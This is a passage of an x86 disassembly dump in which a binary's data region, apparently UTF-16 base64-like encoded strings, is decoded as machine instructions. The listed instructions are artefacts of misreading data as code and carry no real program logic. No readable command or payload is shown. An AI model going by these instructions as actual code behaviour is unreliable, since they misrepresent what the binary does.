10003b4f:	00 45 00             	add    %al,0x0(%ebp)
10003b52:	5a                   	pop    %edx
10003b53:	00 7a 00             	add    %bh,0x0(%edx)
10003b56:	59                   	pop    %ecx
10003b57:	00 7a 00             	add    %bh,0x0(%edx)
10003b5a:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
10003b5e:	4d                   	dec    %ebp
10003b5f:	00 45 00             	add    %al,0x0(%ebp)
10003b62:	70 00                	jo     0x10003b64
10003b64:	55                   	push   %ebp
10003b65:	00 5a 00             	add    %bl,0x0(%edx)
10003b68:	6c                   	insb   (%dx),%es:(%edi)
10003b69:	00 52 00             	add    %dl,0x0(%edx)
10003b6c:	47                   	inc    %edi
10003b6d:	00 63 00             	add    %ah,0x0(%ebx)
10003b70:	32 00                	xor    (%eax),%al
10003b72:	4d                   	dec    %ebp
10003b73:	00 33                	add    %dh,(%ebx)
10003b75:	00 62 00             	add    %ah,0x0(%edx)
10003b78:	44                   	inc    %esp
10003b79:	00 42 00             	add    %al,0x0(%edx)
10003b7c:	46                   	inc    %esi
10003b7d:	00 5a 00             	add    %bl,0x0(%edx)
10003b80:	7a 00                	jp     0x10003b82
10003b82:	42                   	inc    %edx
10003b83:	00 4b 00             	add    %cl,0x0(%ebx)
10003b86:	56                   	push   %esi
10003b87:	00 47 00             	add    %al,0x0(%edi)
10003b8a:	5a                   	pop    %edx
10003b8b:	00 55 00             	add    %dl,0x0(%ebp)
10003b8e:	52                   	push   %edx
10003b8f:	00 6e 00             	add    %ch,0x0(%esi)
10003b92:	4e                   	dec    %esi
10003b93:	00 6a 00             	add    %ch,0x0(%edx)
10003b96:	4e                   	dec    %esi
10003b97:	00 32                	add    %dh,(%edx)
10003b99:	00 77 00             	add    %dh,0x0(%edi)
10003b9c:	77 00                	ja     0x10003b9e
10003b9e:	53                   	push   %ebx
10003b9f:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003ba3:	00 6d 00             	add    %ch,0x0(%ebp)
10003ba6:	56                   	push   %esi
10003ba7:	00 45 00             	add    %al,0x0(%ebp)
10003baa:	5a                   	pop    %edx
10003bab:	00 7a 00             	add    %bh,0x0(%edx)
10003bae:	59                   	pop    %ecx
10003baf:	00 7a 00             	add    %bh,0x0(%edx)
10003bb2:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
10003bb6:	5a                   	pop    %edx
10003bb7:	00 45 00             	add    %al,0x0(%ebp)
10003bba:	63 00                	arpl   %eax,(%eax)
10003bbc:	34 00                	xor    $0x0,%al
10003bbe:	4d                   	dec    %ebp
10003bbf:	00 45 00             	add    %al,0x0(%ebp)
10003bc2:	70 00                	jo     0x10003bc4
10003bc4:	55                   	push   %ebp
10003bc5:	00 5a 00             	add    %bl,0x0(%edx)
10003bc8:	6c                   	insb   (%dx),%es:(%edi)
10003bc9:	00 52 00             	add    %dl,0x0(%edx)
10003bcc:	47                   	inc    %edi
10003bcd:	00 63 00             	add    %ah,0x0(%ebx)
10003bd0:	32 00                	xor    (%eax),%al
10003bd2:	4d                   	dec    %ebp
10003bd3:	00 33                	add    %dh,(%ebx)
10003bd5:	00 62 00             	add    %ah,0x0(%edx)
10003bd8:	44                   	inc    %esp
10003bd9:	00 42 00             	add    %al,0x0(%edx)
10003bdc:	4b                   	dec    %ebx
10003bdd:	00 56 00             	add    %dl,0x0(%esi)
10003be0:	47                   	inc    %edi
10003be1:	00 5a 00             	add    %bl,0x0(%edx)
10003be4:	55                   	push   %ebp
10003be5:	00 52 00             	add    %dl,0x0(%edx)
10003be8:	6e                   	outsb  %ds:(%esi),(%dx)
10003be9:	00 4e 00             	add    %cl,0x0(%esi)
10003bec:	6a 00                	push   $0x0
10003bee:	4e                   	dec    %esi
10003bef:	00 32                	add    %dh,(%edx)
10003bf1:	00 78 00             	add    %bh,0x0(%eax)
10003bf4:	6e                   	outsb  %ds:(%esi),(%dx)
10003bf5:	00 59 00             	add    %bl,0x0(%ecx)
10003bf8:	30 00                	xor    %al,(%eax)
10003bfa:	67 00 77 00          	add    %dh,0x0(%bx)
10003bfe:	53                   	push   %ebx
10003bff:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003c03:	00 6d 00             	add    %ch,0x0(%ebp)
10003c06:	56                   	push   %esi
10003c07:	00 45 00             	add    %al,0x0(%ebp)
10003c0a:	5a                   	pop    %edx
10003c0b:	00 7a 00             	add    %bh,0x0(%edx)
10003c0e:	59                   	pop    %ecx
10003c0f:	00 7a 00             	add    %bh,0x0(%edx)
10003c12:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
10003c16:	4d                   	dec    %ebp
10003c17:	00 45 00             	add    %al,0x0(%ebp)
10003c1a:	70 00                	jo     0x10003c1c
10003c1c:	55                   	push   %ebp
10003c1d:	00 5a 00             	add    %bl,0x0(%edx)
10003c20:	6c                   	insb   (%dx),%es:(%edi)
10003c21:	00 52 00             	add    %dl,0x0(%edx)
10003c24:	47                   	inc    %edi
10003c25:	00 63 00             	add    %ah,0x0(%ebx)
10003c28:	32 00                	xor    (%eax),%al
10003c2a:	4d                   	dec    %ebp
10003c2b:	00 33                	add    %dh,(%ebx)
10003c2d:	00 62 00             	add    %ah,0x0(%edx)
10003c30:	45                   	inc    %ebp
10003c31:	00 70 00             	add    %dh,0x0(%eax)
10003c34:	32 00                	xor    (%eax),%al
10003c36:	57                   	push   %edi
10003c37:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
10003c3b:	00 4b 00             	add    %cl,0x0(%ebx)
10003c3e:	56                   	push   %esi
10003c3f:	00 47 00             	add    %al,0x0(%edi)
10003c42:	5a                   	pop    %edx
10003c43:	00 55 00             	add    %dl,0x0(%ebp)
10003c46:	52                   	push   %edx
10003c47:	00 6e 00             	add    %ch,0x0(%esi)
10003c4a:	4e                   	dec    %esi
10003c4b:	00 6a 00             	add    %ch,0x0(%edx)
10003c4e:	4e                   	dec    %esi
10003c4f:	00 32                	add    %dh,(%edx)
10003c51:	00 77 00             	add    %dh,0x0(%edi)
10003c54:	77 00                	ja     0x10003c56
10003c56:	53                   	push   %ebx
10003c57:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003c5b:	00 6d 00             	add    %ch,0x0(%ebp)
10003c5e:	56                   	push   %esi
10003c5f:	00 45 00             	add    %al,0x0(%ebp)
10003c62:	5a                   	pop    %edx
10003c63:	00 7a 00             	add    %bh,0x0(%edx)
10003c66:	59                   	pop    %ecx
10003c67:	00 7a 00             	add    %bh,0x0(%edx)
10003c6a:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
10003c6e:	4d                   	dec    %ebp
10003c6f:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
10003c73:	00 36                	add    %dh,(%esi)
10003c75:	00 4d 00             	add    %cl,0x0(%ebp)
10003c78:	45                   	inc    %ebp
10003c79:	00 70 00             	add    %dh,0x0(%eax)
10003c7c:	55                   	push   %ebp
10003c7d:	00 5a 00             	add    %bl,0x0(%edx)
10003c80:	6c                   	insb   (%dx),%es:(%edi)
10003c81:	00 52 00             	add    %dl,0x0(%edx)
10003c84:	47                   	inc    %edi
10003c85:	00 63 00             	add    %ah,0x0(%ebx)
10003c88:	32 00                	xor    (%eax),%al
10003c8a:	4d                   	dec    %ebp
10003c8b:	00 33                	add    %dh,(%ebx)
10003c8d:	00 62 00             	add    %ah,0x0(%edx)
10003c90:	44                   	inc    %esp
10003c91:	00 42 00             	add    %al,0x0(%edx)
10003c94:	4b                   	dec    %ebx
10003c95:	00 56 00             	add    %dl,0x0(%esi)
10003c98:	47                   	inc    %edi
10003c99:	00 5a 00             	add    %bl,0x0(%edx)
10003c9c:	55                   	push   %ebp
10003c9d:	00 52 00             	add    %dl,0x0(%edx)
10003ca0:	6e                   	outsb  %ds:(%esi),(%dx)
10003ca1:	00 4e 00             	add    %cl,0x0(%esi)
10003ca4:	6a 00                	push   $0x0
10003ca6:	4e                   	dec    %esi
10003ca7:	00 32                	add    %dh,(%edx)
10003ca9:	00 78 00             	add    %bh,0x0(%eax)
10003cac:	6a 00                	push   $0x0
10003cae:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
10003cb2:	49                   	dec    %ecx
10003cb3:	00 77 00             	add    %dh,0x0(%edi)
10003cb6:	53                   	push   %ebx
10003cb7:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003cbb:	00 6d 00             	add    %ch,0x0(%ebp)
10003cbe:	56                   	push   %esi
10003cbf:	00 45 00             	add    %al,0x0(%ebp)
10003cc2:	5a                   	pop    %edx
10003cc3:	00 7a 00             	add    %bh,0x0(%edx)
10003cc6:	59                   	pop    %ecx
10003cc7:	00 7a 00             	add    %bh,0x0(%edx)
10003cca:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
10003cce:	4d                   	dec    %ebp
10003ccf:	00 45 00             	add    %al,0x0(%ebp)
10003cd2:	70 00                	jo     0x10003cd4
10003cd4:	55                   	push   %ebp
10003cd5:	00 5a 00             	add    %bl,0x0(%edx)
10003cd8:	6c                   	insb   (%dx),%es:(%edi)
10003cd9:	00 52 00             	add    %dl,0x0(%edx)
10003cdc:	47                   	inc    %edi
10003cdd:	00 63 00             	add    %ah,0x0(%ebx)
10003ce0:	32 00                	xor    (%eax),%al
10003ce2:	4d                   	dec    %ebp
10003ce3:	00 33                	add    %dh,(%ebx)
10003ce5:	00 62 00             	add    %ah,0x0(%edx)
10003ce8:	48                   	dec    %eax
10003ce9:	00 52 00             	add    %dl,0x0(%edx)
10003cec:	61                   	popa
10003ced:	00 56 00             	add    %dl,0x0(%esi)
10003cf0:	7a 00                	jp     0x10003cf2
10003cf2:	42                   	inc    %edx
10003cf3:	00 4b 00             	add    %cl,0x0(%ebx)
10003cf6:	56                   	push   %esi
10003cf7:	00 47 00             	add    %al,0x0(%edi)
10003cfa:	5a                   	pop    %edx
10003cfb:	00 55 00             	add    %dl,0x0(%ebp)
10003cfe:	52                   	push   %edx
10003cff:	00 6e 00             	add    %ch,0x0(%esi)
10003d02:	4e                   	dec    %esi
10003d03:	00 6a 00             	add    %ch,0x0(%edx)
10003d06:	4e                   	dec    %esi
10003d07:	00 32                	add    %dh,(%edx)
10003d09:	00 77 00             	add    %dh,0x0(%edi)
10003d0c:	77 00                	ja     0x10003d0e
10003d0e:	53                   	push   %ebx
10003d0f:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003d13:	00 6d 00             	add    %ch,0x0(%ebp)
10003d16:	56                   	push   %esi
10003d17:	00 45 00             	add    %al,0x0(%ebp)
10003d1a:	5a                   	pop    %edx
10003d1b:	00 7a 00             	add    %bh,0x0(%edx)
10003d1e:	59                   	pop    %ecx
10003d1f:	00 7a 00             	add    %bh,0x0(%edx)
10003d22:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
10003d26:	4d                   	dec    %ebp
10003d27:	00 58 00             	add    %bl,0x0(%eax)
10003d2a:	5a                   	pop    %edx
10003d2b:	00 6a 00             	add    %ch,0x0(%edx)
10003d2e:	4d                   	dec    %ebp
10003d2f:	00 45 00             	add    %al,0x0(%ebp)
10003d32:	70 00                	jo     0x10003d34
10003d34:	55                   	push   %ebp
10003d35:	00 5a 00             	add    %bl,0x0(%edx)
10003d38:	6c                   	insb   (%dx),%es:(%edi)
10003d39:	00 52 00             	add    %dl,0x0(%edx)
10003d3c:	47                   	inc    %edi
10003d3d:	00 63 00             	add    %ah,0x0(%ebx)
10003d40:	32 00                	xor    (%eax),%al
10003d42:	4d                   	dec    %ebp
10003d43:	00 33                	add    %dh,(%ebx)
10003d45:	00 62 00             	add    %ah,0x0(%edx)
10003d48:	44                   	inc    %esp
10003d49:	00 42 00             	add    %al,0x0(%edx)
10003d4c:	4b                   	dec    %ebx
10003d4d:	00 56 00             	add    %dl,0x0(%esi)
10003d50:	47                   	inc    %edi
10003d51:	00 5a 00             	add    %bl,0x0(%edx)
10003d54:	55                   	push   %ebp
10003d55:	00 52 00             	add    %dl,0x0(%edx)
10003d58:	6e                   	outsb  %ds:(%esi),(%dx)
10003d59:	00 4e 00             	add    %cl,0x0(%esi)
10003d5c:	6a 00                	push   $0x0
10003d5e:	4e                   	dec    %esi
10003d5f:	00 32                	add    %dh,(%edx)
10003d61:	00 78 00             	add    %bh,0x0(%eax)
10003d64:	75 00                	jne    0x10003d66
10003d66:	61                   	popa
10003d67:	00 7a 00             	add    %bh,0x0(%edx)
10003d6a:	30 00                	xor    %al,(%eax)
10003d6c:	77 00                	ja     0x10003d6e
10003d6e:	53                   	push   %ebx
10003d6f:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003d73:	00 6d 00             	add    %ch,0x0(%ebp)
10003d76:	56                   	push   %esi
10003d77:	00 45 00             	add    %al,0x0(%ebp)
10003d7a:	5a                   	pop    %edx
10003d7b:	00 7a 00             	add    %bh,0x0(%edx)
10003d7e:	59                   	pop    %ecx
10003d7f:	00 7a 00             	add    %bh,0x0(%edx)
10003d82:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
10003d86:	00 15 30 00 4a 00    	add    %dl,0x4a0030
10003d8c:	54                   	push   %esp
10003d8d:	00 66 00             	add    %ah,0x0(%esi)
10003d90:	54                   	push   %esp
10003d91:	00 46 00             	add    %al,0x0(%esi)
10003d94:	73 00                	jae    0x10003d96
10003d96:	63 00                	arpl   %eax,(%eax)
10003d98:	37                   	aaa
10003d99:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
10003d9d:	81 b1 53 00 6b 00 46 	xorl   $0x590046,0x6b0053(%ecx)
10003da4:	00 59 00 
10003da7:	53                   	push   %ebx
10003da8:	00 32                	add    %dh,(%edx)
10003daa:	00 77 00             	add    %dh,0x0(%edi)
10003dad:	31 00                	xor    %eax,(%eax)
10003daf:	63 00                	arpl   %eax,(%eax)
10003db1:	46                   	inc    %esi
10003db2:	00 49 00             	add    %cl,0x0(%ecx)
10003db5:	77 00                	ja     0x10003db7
10003db7:	56                   	push   %esi
10003db8:	00 56 00             	add    %dl,0x0(%esi)
10003dbb:	6c                   	insb   (%dx),%es:(%edi)
10003dbc:	00 59 00             	add    %bl,0x0(%ecx)
10003dbf:	54                   	push   %esp
10003dc0:	00 6b 00             	add    %ch,0x0(%ebx)
10003dc3:	70 00                	jo     0x10003dc5
10003dc5:	42                   	inc    %edx
10003dc6:	00 57 00             	add    %dl,0x0(%edi)
10003dc9:	45                   	inc    %ebp
10003dca:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
10003dce:	00 4e 00             	add    %cl,0x0(%esi)
10003dd1:	58                   	pop    %eax
10003dd2:	00 42 00             	add    %al,0x0(%edx)
10003dd5:	53                   	push   %ebx
10003dd6:	00 4d 00             	add    %cl,0x0(%ebp)
10003dd9:	46                   	inc    %esi
10003dda:	00 56 00             	add    %dl,0x0(%esi)
10003ddd:	4b                   	dec    %ebx
10003dde:	00 51 00             	add    %dl,0x0(%ecx)
10003de1:	56                   	push   %esi
10003de2:	00 68 00             	add    %ch,0x0(%eax)
10003de5:	4c                   	dec    %esp
10003de6:	00 62 00             	add    %ah,0x0(%edx)
10003de9:	44                   	inc    %esp
10003dea:	00 56 00             	add    %dl,0x0(%esi)
10003ded:	77 00                	ja     0x10003def
10003def:	55                   	push   %ebp
10003df0:	00 6a 00             	add    %ch,0x0(%edx)
10003df3:	42                   	inc    %edx
10003df4:	00 56 00             	add    %dl,0x0(%esi)
10003df7:	64 00 32             	add    %dh,%fs:(%edx)
10003dfa:	00 4a 00             	add    %cl,0x0(%edx)
10003dfd:	74 00                	je     0x10003dff
10003dff:	53                   	push   %ebx
10003e00:	00 6b 00             	add    %ch,0x0(%ebx)
10003e03:	46                   	inc    %esi
10003e04:	00 59 00             	add    %bl,0x0(%ecx)
10003e07:	53                   	push   %ebx
10003e08:	00 32                	add    %dh,(%edx)
10003e0a:	00 77 00             	add    %dh,0x0(%edi)
10003e0d:	31 00                	xor    %eax,(%eax)
10003e0f:	63 00                	arpl   %eax,(%eax)
10003e11:	46                   	inc    %esi
10003e12:	00 49 00             	add    %cl,0x0(%ecx)
10003e15:	77 00                	ja     0x10003e17
10003e17:	56                   	push   %esi
10003e18:	00 55 00             	add    %dl,0x0(%ebp)
10003e1b:	70 00                	jo     0x10003e1d
10003e1d:	42                   	inc    %edx
10003e1e:	00 57 00             	add    %dl,0x0(%edi)
10003e21:	45                   	inc    %ebp
10003e22:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
10003e26:	00 4e 00             	add    %cl,0x0(%esi)
10003e29:	58                   	pop    %eax
10003e2a:	00 42 00             	add    %al,0x0(%edx)
10003e2d:	53                   	push   %ebx
10003e2e:	00 4d 00             	add    %cl,0x0(%ebp)
10003e31:	46                   	inc    %esi
10003e32:	00 56 00             	add    %dl,0x0(%esi)
10003e35:	57                   	push   %edi
10003e36:	00 4d 00             	add    %cl,0x0(%ebp)
10003e39:	46                   	inc    %esi
10003e3a:	00 68 00             	add    %ch,0x0(%eax)
10003e3d:	4b                   	dec    %ebx
10003e3e:	00 51 00             	add    %dl,0x0(%ecx)
10003e41:	56                   	push   %esi
10003e42:	00 68 00             	add    %ch,0x0(%eax)
10003e45:	4c                   	dec    %esp
10003e46:	00 62 00             	add    %ah,0x0(%edx)
10003e49:	44                   	inc    %esp
10003e4a:	00 56 00             	add    %dl,0x0(%esi)
10003e4d:	77 00                	ja     0x10003e4f
10003e4f:	55                   	push   %ebp
10003e50:	00 6a 00             	add    %ch,0x0(%edx)
10003e53:	42                   	inc    %edx
10003e54:	00 56 00             	add    %dl,0x0(%esi)
10003e57:	53                   	push   %ebx
10003e58:	00 6b 00             	add    %ch,0x0(%ebx)
10003e5b:	46                   	inc    %esi
10003e5c:	00 59 00             	add    %bl,0x0(%ecx)
10003e5f:	53                   	push   %ebx
10003e60:	00 32                	add    %dh,(%edx)
10003e62:	00 77 00             	add    %dh,0x0(%edi)
10003e65:	31 00                	xor    %eax,(%eax)
10003e67:	63 00                	arpl   %eax,(%eax)
10003e69:	46                   	inc    %esi
10003e6a:	00 49 00             	add    %cl,0x0(%ecx)
10003e6d:	77 00                	ja     0x10003e6f
10003e6f:	56                   	push   %esi
10003e70:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
10003e74:	00 4b 00             	add    %cl,0x0(%ebx)
10003e77:	62 00                	bound  %eax,(%eax)
10003e79:	45                   	inc    %ebp
10003e7a:	00 70 00             	add    %dh,0x0(%eax)
10003e7d:	42                   	inc    %edx
10003e7e:	00 57 00             	add    %dl,0x0(%edi)
10003e81:	45                   	inc    %ebp
10003e82:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
10003e86:	00 4e 00             	add    %cl,0x0(%esi)
10003e89:	58                   	pop    %eax
10003e8a:	00 42 00             	add    %al,0x0(%edx)
10003e8d:	53                   	push   %ebx
10003e8e:	00 4d 00             	add    %cl,0x0(%ebp)
10003e91:	46                   	inc    %esi
10003e92:	00 56 00             	add    %dl,0x0(%esi)
10003e95:	4b                   	dec    %ebx
10003e96:	00 51 00             	add    %dl,0x0(%ecx)
10003e99:	56                   	push   %esi
10003e9a:	00 68 00             	add    %ch,0x0(%eax)
10003e9d:	4c                   	dec    %esp
10003e9e:	00 62 00             	add    %ah,0x0(%edx)
10003ea1:	44                   	inc    %esp
10003ea2:	00 56 00             	add    %dl,0x0(%esi)
10003ea5:	77 00                	ja     0x10003ea7
10003ea7:	55                   	push   %ebp
10003ea8:	00 6a 00             	add    %ch,0x0(%edx)
10003eab:	42                   	inc    %edx
10003eac:	00 56 00             	add    %dl,0x0(%esi)
10003eaf:	57                   	push   %edi
10003eb0:	00 6a 00             	add    %ch,0x0(%edx)
10003eb3:	4e                   	dec    %esi
10003eb4:	00 4f 00             	add    %cl,0x0(%edi)
10003eb7:	53                   	push   %ebx
10003eb8:	00 6b 00             	add    %ch,0x0(%ebx)
10003ebb:	46                   	inc    %esi
10003ebc:	00 59 00             	add    %bl,0x0(%ecx)
10003ebf:	53                   	push   %ebx
10003ec0:	00 32                	add    %dh,(%edx)
10003ec2:	00 77 00             	add    %dh,0x0(%edi)
10003ec5:	31 00                	xor    %eax,(%eax)
10003ec7:	63 00                	arpl   %eax,(%eax)
10003ec9:	46                   	inc    %esi
10003eca:	00 49 00             	add    %cl,0x0(%ecx)
10003ecd:	77 00                	ja     0x10003ecf
10003ecf:	56                   	push   %esi
10003ed0:	00 55 00             	add    %dl,0x0(%ebp)
10003ed3:	70 00                	jo     0x10003ed5
10003ed5:	42                   	inc    %edx
10003ed6:	00 57 00             	add    %dl,0x0(%edi)
10003ed9:	45                   	inc    %ebp
10003eda:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
10003ede:	00 4e 00             	add    %cl,0x0(%esi)
10003ee1:	58                   	pop    %eax
10003ee2:	00 42 00             	add    %al,0x0(%edx)
10003ee5:	53                   	push   %ebx
10003ee6:	00 4d 00             	add    %cl,0x0(%ebp)
10003ee9:	46                   	inc    %esi
10003eea:	00 56 00             	add    %dl,0x0(%esi)
10003eed:	34 00                	xor    $0x0,%al
10003eef:	59                   	pop    %ecx
10003ef0:	00 6b 00             	add    %ch,0x0(%ebx)
10003ef3:	46                   	inc    %esi
10003ef4:	00 4b 00             	add    %cl,0x0(%ebx)
10003ef7:	51                   	push   %ecx
10003ef8:	00 56 00             	add    %dl,0x0(%esi)
10003efb:	68 00 4c 00 62       	push   $0x62004c00
10003f00:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
10003f04:	00 77 00             	add    %dh,0x0(%edi)
10003f07:	55                   	push   %ebp
10003f08:	00 6a 00             	add    %ch,0x0(%edx)
10003f0b:	42                   	inc    %edx
10003f0c:	00 56 00             	add    %dl,0x0(%esi)
10003f0f:	53                   	push   %ebx
10003f10:	00 6b 00             	add    %ch,0x0(%ebx)
10003f13:	46                   	inc    %esi
10003f14:	00 59 00             	add    %bl,0x0(%ecx)
10003f17:	53                   	push   %ebx
10003f18:	00 32                	add    %dh,(%edx)
10003f1a:	00 77 00             	add    %dh,0x0(%edi)
10003f1d:	31 00                	xor    %eax,(%eax)
10003f1f:	63 00                	arpl   %eax,(%eax)
10003f21:	46                   	inc    %esi
10003f22:	00 49 00             	add    %cl,0x0(%ecx)
10003f25:	77 00                	ja     0x10003f27
10003f27:	56                   	push   %esi
10003f28:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
10003f2c:	00 39                	add    %bh,(%ecx)
10003f2e:	00 53 00             	add    %dl,0x0(%ebx)
10003f31:	6b 00 46             	imul   $0x46,(%eax),%eax
10003f34:	00 59 00             	add    %bl,0x0(%ecx)
10003f37:	53                   	push   %ebx
10003f38:	00 32                	add    %dh,(%edx)
10003f3a:	00 77 00             	add    %dh,0x0(%edi)
10003f3d:	31 00                	xor    %eax,(%eax)
10003f3f:	63 00                	arpl   %eax,(%eax)
10003f41:	46                   	inc    %esi
10003f42:	00 49 00             	add    %cl,0x0(%ecx)
10003f45:	77 00                	ja     0x10003f47
10003f47:	56                   	push   %esi
10003f48:	00 51 00             	add    %dl,0x0(%ecx)
10003f4b:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10003f50:	15 4a 00 41 00       	adc    $0x41004a,%eax
10003f55:	58                   	pop    %eax
10003f56:	00 4b 00             	add    %cl,0x0(%ebx)
10003f59:	6c                   	insb   (%dx),%es:(%edi)
10003f5a:	00 35 00 70 00 52    	add    %dh,0x52007000
10003f60:	00 30                	add    %dh,(%eax)
10003f62:	00 55 00             	add    %dl,0x0(%ebp)
10003f65:	00 81 b1 62 00 33    	add    %al,0x330062b1(%ecx)
10003f6b:	00 70 00             	add    %dh,0x0(%eax)
10003f6e:	46                   	inc    %esi
10003f6f:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
10003f73:	00 46 00             	add    %al,0x0(%esi)
10003f76:	45                   	inc    %ebp
10003f77:	00 5a 00             	add    %bl,0x0(%edx)
10003f7a:	54                   	push   %esp
10003f7b:	00 45 00             	add    %al,0x0(%ebp)
10003f7e:	7a 00                	jp     0x10003f80
10003f80:	57                   	push   %edi
10003f81:	00 56 00             	add    %dl,0x0(%esi)
10003f84:	6c                   	insb   (%dx),%es:(%edi)
10003f85:	00 59 00             	add    %bl,0x0(%ecx)
10003f88:	54                   	push   %esp
10003f89:	00 6d 00             	add    %ch,0x0(%ebp)
10003f8c:	39 00                	cmp    %eax,(%eax)
10003f8e:	36 00 52 00          	add    %dl,%ss:0x0(%edx)
10003f92:	55                   	push   %ebp
10003f93:	00 35 00 42 00 52    	add    %dh,0x52004200
10003f99:	00 47 00             	add    %al,0x0(%edi)
10003f9c:	55                   	push   %ebp
10003f9d:	00 78 00             	add    %bh,0x0(%eax)
10003fa0:	4d                   	dec    %ebp
10003fa1:	00 31                	add    %dh,(%ecx)
10003fa3:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
10003fa7:	00 65 00             	add    %ah,0x0(%ebp)
10003faa:	6b 00 56             	imul   $0x56,(%eax),%eax
10003fad:	00 4f 00             	add    %cl,0x0(%edi)
10003fb0:	51                   	push   %ecx
10003fb1:	00 55 00             	add    %dl,0x0(%ebp)
10003fb4:	52                   	push   %edx
10003fb5:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
10003fb9:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
10003fbd:	00 5a 00             	add    %bl,0x0(%edx)
10003fc0:	64 00 32             	add    %dh,%fs:(%edx)
10003fc3:	00 4a 00             	add    %cl,0x0(%edx)
10003fc6:	74 00                	je     0x10003fc8
10003fc8:	62 00                	bound  %eax,(%eax)
10003fca:	33 00                	xor    (%eax),%eax
10003fcc:	70 00                	jo     0x10003fce
10003fce:	46                   	inc    %esi
10003fcf:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
10003fd3:	00 46 00             	add    %al,0x0(%esi)
10003fd6:	45                   	inc    %ebp
10003fd7:	00 5a 00             	add    %bl,0x0(%edx)
10003fda:	54                   	push   %esp
10003fdb:	00 45 00             	add    %al,0x0(%ebp)
10003fde:	7a 00                	jp     0x10003fe0
10003fe0:	57                   	push   %edi
10003fe1:	00 57 00             	add    %dl,0x0(%edi)
10003fe4:	39 00                	cmp    %eax,(%eax)
10003fe6:	36 00 52 00          	add    %dl,%ss:0x0(%edx)
10003fea:	55                   	push   %ebp
10003feb:	00 35 00 42 00 52    	add    %dh,0x52004200
10003ff1:	00 47 00             	add    %al,0x0(%edi)
10003ff4:	55                   	push   %ebp
10003ff5:	00 78 00             	add    %bh,0x0(%eax)
10003ff8:	4d                   	dec    %ebp
10003ff9:	00 31                	add    %dh,(%ecx)
10003ffb:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
10003fff:	00 4d 00             	add    %cl,0x0(%ebp)
10004002:	46                   	inc    %esi
10004003:	00 68 00             	add    %ch,0x0(%eax)
10004006:	76 00                	jbe    0x10004008
10004008:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
1000400c:	56                   	push   %esi
1000400d:	00 4f 00             	add    %cl,0x0(%edi)
10004010:	51                   	push   %ecx
10004011:	00 55 00             	add    %dl,0x0(%ebp)
10004014:	52                   	push   %edx
10004015:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
10004019:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
1000401d:	00 5a 00             	add    %bl,0x0(%edx)
10004020:	62 00                	bound  %eax,(%eax)
10004022:	33 00                	xor    (%eax),%eax
10004024:	70 00                	jo     0x10004026
10004026:	46                   	inc    %esi
10004027:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
1000402b:	00 46 00             	add    %al,0x0(%esi)
1000402e:	45                   	inc    %ebp
1000402f:	00 5a 00             	add    %bl,0x0(%edx)
10004032:	54                   	push   %esp
10004033:	00 45 00             	add    %al,0x0(%ebp)
10004036:	7a 00                	jp     0x10004038
10004038:	57                   	push   %edi
10004039:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
1000403d:	00 4f 00             	add    %cl,0x0(%edi)
10004040:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004044:	39 00                	cmp    %eax,(%eax)
10004046:	36 00 52 00          	add    %dl,%ss:0x0(%edx)
1000404a:	55                   	push   %ebp
1000404b:	00 35 00 42 00 52    	add    %dh,0x52004200
10004051:	00 47 00             	add    %al,0x0(%edi)
10004054:	55                   	push   %ebp
10004055:	00 78 00             	add    %bh,0x0(%eax)
10004058:	4d                   	dec    %ebp
10004059:	00 31                	add    %dh,(%ecx)
1000405b:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
1000405f:	00 65 00             	add    %ah,0x0(%ebp)
10004062:	6b 00 56             	imul   $0x56,(%eax),%eax
10004065:	00 4f 00             	add    %cl,0x0(%edi)
10004068:	51                   	push   %ecx
10004069:	00 55 00             	add    %dl,0x0(%ebp)
1000406c:	52                   	push   %edx
1000406d:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
10004071:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
10004075:	00 5a 00             	add    %bl,0x0(%edx)
10004078:	59                   	pop    %ecx
10004079:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
1000407d:	00 43 00             	add    %al,0x0(%ebx)
10004080:	62 00                	bound  %eax,(%eax)
10004082:	33 00                	xor    (%eax),%eax
10004084:	70 00                	jo     0x10004086
10004086:	46                   	inc    %esi
10004087:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
1000408b:	00 46 00             	add    %al,0x0(%esi)
1000408e:	45                   	inc    %ebp
1000408f:	00 5a 00             	add    %bl,0x0(%edx)
10004092:	54                   	push   %esp
10004093:	00 45 00             	add    %al,0x0(%ebp)
